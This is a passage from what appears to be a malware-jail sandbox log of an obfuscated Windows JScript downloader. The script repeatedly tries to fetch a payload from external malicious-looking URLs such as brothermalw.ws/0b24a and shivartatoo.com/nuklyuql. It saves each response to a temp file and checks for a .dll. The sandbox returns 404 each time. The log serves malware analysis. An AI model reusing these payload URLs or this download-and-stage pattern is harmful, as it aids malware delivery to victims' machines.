+18 May 18:42:27 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:27 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:27 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:27 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:27 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:27 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:27 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:27 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:27 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:27 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:27 - new ADODB_Stream[30]
+18 May 18:42:27 - ADODB_Stream[30].Open()
+18 May 18:42:27 - ADODB_Stream[30].type = (number) '1'
+18 May 18:42:27 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:27 - ADODB_Stream[30].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:27 - ADODB_Stream[30].Write(str) - 27 bytes
+18 May 18:42:27 - ADODB_Stream[30].size = (number) '27'
+18 May 18:42:27 - ADODB_Stream[30].position = (number) '0'
+18 May 18:42:27 - ADODB_Stream[30].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:27 - ADODB_Stream[30].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:27 - ADODB_Stream[30].Close()
+18 May 18:42:27 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:27 - new ADODB_Stream[31]
+18 May 18:42:27 - ADODB_Stream[31].type = (number) '2'
+18 May 18:42:27 - ADODB_Stream[31].charset = (string) '437'
+18 May 18:42:27 - ADODB_Stream[31].Open()
+18 May 18:42:27 - ADODB_Stream[31].type.get() => (number) '2'
+18 May 18:42:27 - ADODB_Stream[31].charset.get() => (string) '437'
+18 May 18:42:27 - ADODB_Stream[31].charset.get() => (string) '437'
+18 May 18:42:27 - ADODB_Stream[31].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:27 - ADODB_Stream[31].charset.get() => (string) '437'
+18 May 18:42:27 - ADODB_Stream[31].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:27 - ADODB_Stream[31].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:27 - ADODB_Stream[31].position = (number) '0'
+18 May 18:42:27 - ADODB_Stream[31].Close()
+18 May 18:42:27 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:27 - WScript.Sleep(1000)
+18 May 18:42:28 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:28 - MSXML2.XMLHTTP[20].open(GET,http://brothermalw.ws/0b24a,false)
+18 May 18:42:28 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:28 - MSXML2.XMLHTTP[20].url = (string) 'http://brothermalw.ws/0b24a'
+18 May 18:42:28 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:28 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:28 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:28 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:28 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:28 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:28 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:28 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:28 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:28 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:28 - new ADODB_Stream[32]
+18 May 18:42:28 - ADODB_Stream[32].Open()
+18 May 18:42:28 - ADODB_Stream[32].type = (number) '1'
+18 May 18:42:28 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:28 - ADODB_Stream[32].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:28 - ADODB_Stream[32].Write(str) - 27 bytes
+18 May 18:42:28 - ADODB_Stream[32].size = (number) '27'
+18 May 18:42:28 - ADODB_Stream[32].position = (number) '0'
+18 May 18:42:28 - ADODB_Stream[32].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:28 - ADODB_Stream[32].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:28 - ADODB_Stream[32].Close()
+18 May 18:42:28 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:28 - new ADODB_Stream[33]
+18 May 18:42:28 - ADODB_Stream[33].type = (number) '2'
+18 May 18:42:28 - ADODB_Stream[33].charset = (string) '437'
+18 May 18:42:28 - ADODB_Stream[33].Open()
+18 May 18:42:28 - ADODB_Stream[33].type.get() => (number) '2'
+18 May 18:42:28 - ADODB_Stream[33].charset.get() => (string) '437'
+18 May 18:42:28 - ADODB_Stream[33].charset.get() => (string) '437'
+18 May 18:42:28 - ADODB_Stream[33].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:28 - ADODB_Stream[33].charset.get() => (string) '437'
+18 May 18:42:28 - ADODB_Stream[33].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:28 - ADODB_Stream[33].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:28 - ADODB_Stream[33].position = (number) '0'
+18 May 18:42:28 - ADODB_Stream[33].Close()
+18 May 18:42:28 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:28 - WScript.Sleep(1000)
+18 May 18:42:29 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:29 - MSXML2.XMLHTTP[20].open(GET,http://www.shivartatoo.com/nuklyuql,false)
+18 May 18:42:29 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:29 - MSXML2.XMLHTTP[20].url = (string) 'http://www.shivartatoo.com/nuklyuql'
+18 May 18:42:29 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:29 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:29 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:29 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:29 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:29 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:29 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:29 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:29 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:29 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:29 - new ADODB_Stream[34]
+18 May 18:42:29 - ADODB_Stream[34].Open()
+18 May 18:42:29 - ADODB_Stream[34].type = (number) '1'
+18 May 18:42:29 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:29 - ADODB_Stream[34].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:29 - ADODB_Stream[34].Write(str) - 27 bytes
+18 May 18:42:29 - ADODB_Stream[34].size = (number) '27'
+18 May 18:42:29 - ADODB_Stream[34].position = (number) '0'
+18 May 18:42:29 - ADODB_Stream[34].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:29 - ADODB_Stream[34].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:29 - ADODB_Stream[34].Close()
+18 May 18:42:29 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:29 - new ADODB_Stream[35]
+18 May 18:42:29 - ADODB_Stream[35].type = (number) '2'
+18 May 18:42:29 - ADODB_Stream[35].charset = (string) '437'
+18 May 18:42:29 - ADODB_Stream[35].Open()
+18 May 18:42:29 - ADODB_Stream[35].type.get() => (number) '2'
+18 May 18:42:29 - ADODB_Stream[35].charset.get() => (string) '437'
+18 May 18:42:29 - ADODB_Stream[35].charset.get() => (string) '437'
+18 May 18:42:29 - ADODB_Stream[35].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:29 - ADODB_Stream[35].charset.get() => (string) '437'
+18 May 18:42:29 - ADODB_Stream[35].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:29 - ADODB_Stream[35].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:29 - ADODB_Stream[35].position = (number) '0'
+18 May 18:42:29 - ADODB_Stream[35].Close()
+18 May 18:42:29 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:29 - WScript.Sleep(1000)
+18 May 18:42:30 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:30 - MSXML2.XMLHTTP[20].open(GET,http://www.shivartatoo.com/nuklyuql,false)
+18 May 18:42:30 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:30 - MSXML2.XMLHTTP[20].url = (string) 'http://www.shivartatoo.com/nuklyuql'
+18 May 18:42:30 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:30 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:30 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:30 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:30 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:30 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:30 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:30 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:30 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:30 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:30 - new ADODB_Stream[36]
+18 May 18:42:30 - ADODB_Stream[36].Open()
+18 May 18:42:30 - ADODB_Stream[36].type = (number) '1'
+18 May 18:42:30 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:30 - ADODB_Stream[36].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:30 - ADODB_Stream[36].Write(str) - 27 bytes
+18 May 18:42:30 - ADODB_Stream[36].size = (number) '27'
+18 May 18:42:30 - ADODB_Stream[36].position = (number) '0'
+18 May 18:42:30 - ADODB_Stream[36].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:30 - ADODB_Stream[36].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:30 - ADODB_Stream[36].Close()
+18 May 18:42:30 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:30 - new ADODB_Stream[37]
+18 May 18:42:30 - ADODB_Stream[37].type = (number) '2'
+18 May 18:42:30 - ADODB_Stream[37].charset = (string) '437'
+18 May 18:42:30 - ADODB_Stream[37].Open()
+18 May 18:42:30 - ADODB_Stream[37].type.get() => (number) '2'
+18 May 18:42:30 - ADODB_Stream[37].charset.get() => (string) '437'
+18 May 18:42:30 - ADODB_Stream[37].charset.get() => (string) '437'
+18 May 18:42:30 - ADODB_Stream[37].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:30 - ADODB_Stream[37].charset.get() => (string) '437'
+18 May 18:42:30 - ADODB_Stream[37].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:30 - ADODB_Stream[37].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:30 - ADODB_Stream[37].position = (number) '0'
+18 May 18:42:30 - ADODB_Stream[37].Close()
+18 May 18:42:30 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:30 - WScript.Sleep(1000)
+18 May 18:42:31 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:31 - MSXML2.XMLHTTP[20].open(GET,http://www.shivartatoo.com/nuklyuql,false)
+18 May 18:42:31 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:31 - MSXML2.XMLHTTP[20].url = (string) 'http://www.shivartatoo.com/nuklyuql'
+18 May 18:42:31 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:31 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:31 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:31 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:31 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:31 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:31 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:31 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:31 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:31 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:31 - new ADODB_Stream[38]
+18 May 18:42:31 - ADODB_Stream[38].Open()
+18 May 18:42:31 - ADODB_Stream[38].type = (number) '1'
+18 May 18:42:31 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:31 - ADODB_Stream[38].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:31 - ADODB_Stream[38].Write(str) - 27 bytes
+18 May 18:42:31 - ADODB_Stream[38].size = (number) '27'
+18 May 18:42:31 - ADODB_Stream[38].position = (number) '0'
+18 May 18:42:31 - ADODB_Stream[38].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:31 - ADODB_Stream[38].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:31 - ADODB_Stream[38].Close()
+18 May 18:42:31 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:31 - new ADODB_Stream[39]
+18 May 18:42:31 - ADODB_Stream[39].type = (number) '2'
+18 May 18:42:31 - ADODB_Stream[39].charset = (string) '437'
+18 May 18:42:31 - ADODB_Stream[39].Open()
+18 May 18:42:31 - ADODB_Stream[39].type.get() => (number) '2'
+18 May 18:42:31 - ADODB_Stream[39].charset.get() => (string) '437'
+18 May 18:42:31 - ADODB_Stream[39].charset.get() => (string) '437'
+18 May 18:42:31 - ADODB_Stream[39].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:31 - ADODB_Stream[39].charset.get() => (string) '437'
+18 May 18:42:31 - ADODB_Stream[39].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:31 - ADODB_Stream[39].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:31 - ADODB_Stream[39].position = (number) '0'
+18 May 18:42:31 - ADODB_Stream[39].Close()
+18 May 18:42:31 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:31 - WScript.Sleep(1000)
+18 May 18:42:32 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:32 - MSXML2.XMLHTTP[20].open(GET,http://www.shivartatoo.com/nuklyuql,false)
+18 May 18:42:32 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:32 - MSXML2.XMLHTTP[20].url = (string) 'http://www.shivartatoo.com/nuklyuql'
+18 May 18:42:32 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:32 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:32 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:32 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:32 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:32 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:32 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:32 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:32 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:32 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:32 - new ADODB_Stream[40]
+18 May 18:42:32 - ADODB_Stream[40].Open()
+18 May 18:42:32 - ADODB_Stream[40].type = (number) '1'
+18 May 18:42:32 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:32 - ADODB_Stream[40].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:32 - ADODB_Stream[40].Write(str) - 27 bytes
+18 May 18:42:32 - ADODB_Stream[40].size = (number) '27'
+18 May 18:42:32 - ADODB_Stream[40].position = (number) '0'
+18 May 18:42:32 - ADODB_Stream[40].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:32 - ADODB_Stream[40].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:32 - ADODB_Stream[40].Close()
+18 May 18:42:32 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:32 - new ADODB_Stream[41]
+18 May 18:42:32 - ADODB_Stream[41].type = (number) '2'
+18 May 18:42:32 - ADODB_Stream[41].charset = (string) '437'
+18 May 18:42:32 - ADODB_Stream[41].Open()
+18 May 18:42:32 - ADODB_Stream[41].type.get() => (number) '2'
+18 May 18:42:32 - ADODB_Stream[41].charset.get() => (string) '437'
+18 May 18:42:32 - ADODB_Stream[41].charset.get() => (string) '437'
+18 May 18:42:32 - ADODB_Stream[41].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:32 - ADODB_Stream[41].charset.get() => (string) '437'
+18 May 18:42:32 - ADODB_Stream[41].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:32 - ADODB_Stream[41].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:32 - ADODB_Stream[41].position = (number) '0'
+18 May 18:42:32 - ADODB_Stream[41].Close()
+18 May 18:42:32 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:32 - WScript.Sleep(1000)
+18 May 18:42:33 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:33 - MSXML2.XMLHTTP[20].open(GET,http://wm08g63hd.homepage.t-online.de/8kkap,false)
+18 May 18:42:33 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:33 - MSXML2.XMLHTTP[20].url = (string) 'http://wm08g63hd.homepage.t-online.de/8kkap'
+18 May 18:42:33 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:33 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:33 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:33 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:33 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:33 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:33 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:33 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:33 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:33 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:33 - new ADODB_Stream[42]
+18 May 18:42:33 - ADODB_Stream[42].Open()
+18 May 18:42:33 - ADODB_Stream[42].type = (number) '1'
+18 May 18:42:33 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:33 - ADODB_Stream[42].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:33 - ADODB_Stream[42].Write(str) - 27 bytes
+18 May 18:42:33 - ADODB_Stream[42].size = (number) '27'
+18 May 18:42:33 - ADODB_Stream[42].position = (number) '0'
+18 May 18:42:33 - ADODB_Stream[42].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:33 - ADODB_Stream[42].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:33 - ADODB_Stream[42].Close()
+18 May 18:42:33 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:33 - new ADODB_Stream[43]
+18 May 18:42:33 - ADODB_Stream[43].type = (number) '2'
+18 May 18:42:33 - ADODB_Stream[43].charset = (string) '437'
+18 May 18:42:33 - ADODB_Stream[43].Open()
+18 May 18:42:33 - ADODB_Stream[43].type.get() => (number) '2'
+18 May 18:42:33 - ADODB_Stream[43].charset.get() => (string) '437'
+18 May 18:42:33 - ADODB_Stream[43].charset.get() => (string) '437'
+18 May 18:42:33 - ADODB_Stream[43].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:33 - ADODB_Stream[43].charset.get() => (string) '437'
+18 May 18:42:33 - ADODB_Stream[43].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:33 - ADODB_Stream[43].LoadFromFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7) 27 bytes, encoding: 437
+18 May 18:42:33 - ADODB_Stream[43].position = (number) '0'
+18 May 18:42:33 - ADODB_Stream[43].Close()
+18 May 18:42:33 - >>> Silencing catch TypeError: IBx3[((OBc + NOs) + Pp)] is not a function
+    at St (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:667:30)
+    at OMb (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:527:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:461:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at ./malware/localhost_05-18_18-42-0023_8346BE7A/localhost_18-42-0023.js:21:6
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+18 May 18:42:33 - WScript.Sleep(1000)
+18 May 18:42:34 - Scripting.FileSystemObject[21].FileExists(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7.dll) => false
+18 May 18:42:34 - MSXML2.XMLHTTP[20].open(GET,http://wm08g63hd.homepage.t-online.de/8kkap,false)
+18 May 18:42:34 - MSXML2.XMLHTTP[20].method = (string) 'GET'
+18 May 18:42:34 - MSXML2.XMLHTTP[20].url = (string) 'http://wm08g63hd.homepage.t-online.de/8kkap'
+18 May 18:42:34 - MSXML2.XMLHTTP[20].async = (boolean) 'false'
+18 May 18:42:34 - MSXML2.XMLHTTP[20].send(undefined)
+18 May 18:42:34 - MSXML2.XMLHTTP[20] Intentionally returning HTTP/404
+18 May 18:42:34 - MSXML2.XMLHTTP[20].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:34 - MSXML2.XMLHTTP[20].status = (number) '404'
+18 May 18:42:34 - MSXML2.XMLHTTP[20].readystate = (number) '4'
+18 May 18:42:34 - MSXML2.XMLHTTP[20].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:34 - MSXML2.XMLHTTP[20].send(undefined) finished
+18 May 18:42:34 - MSXML2.XMLHTTP[20].readystate.get() => (number) '4'
+18 May 18:42:34 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:34 - new ADODB_Stream[44]
+18 May 18:42:34 - ADODB_Stream[44].Open()
+18 May 18:42:34 - ADODB_Stream[44].type = (number) '1'
+18 May 18:42:34 - MSXML2.XMLHTTP[20].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:34 - ADODB_Stream[44].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:34 - ADODB_Stream[44].Write(str) - 27 bytes
+18 May 18:42:34 - ADODB_Stream[44].size = (number) '27'
+18 May 18:42:34 - ADODB_Stream[44].position = (number) '0'
+18 May 18:42:34 - ADODB_Stream[44].SaveToFile(C:\Users\User\AppData\Local\Temp/tO7i5T0baEMUO7, 2)
+18 May 18:42:34 - ADODB_Stream[44].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:34 - ADODB_Stream[44].Close()
+18 May 18:42:34 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:34 - new ADODB_Stream[45]
+18 May 18:42:34 - ADODB_Stream[45].type = (number) '2'
+18 May 18:42:34 - ADODB_Stream[45].charset = (string) '437'
